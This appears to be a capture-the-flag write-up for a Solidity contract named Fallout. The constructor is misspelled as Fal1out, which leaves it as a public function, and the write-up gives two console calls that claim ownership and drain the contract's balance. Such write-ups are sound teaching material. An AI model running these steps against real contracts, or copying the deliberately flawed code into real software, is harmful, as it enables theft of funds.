## contract code :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

**Vulnerability:**
The core vulnerability lies within the intended constructor function. In older versions of Solidity, a constructor had to share the exact same name as the contract. 

```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

The problem is a typographical error where the developer used the number `1` instead of the lowercase letter `l` in the function name (`Fal1out` vs `Fallout`). Because of this typo, the compiler treats it as a standard public function rather than a constructor. This allows any external user to call it at any time to claim ownership of the contract and withdraw the remaining funds.

## Exploit Steps
1. **Call the misnamed constructor function** to claim ownership of the contract:
   ```javascript
   await contract.Fal1out()
   ```
2. **Drain the contract** by invoking the now-accessible `collectAllocations()` function:
   ```javascript
   await contract.collectAllocations()
   ```
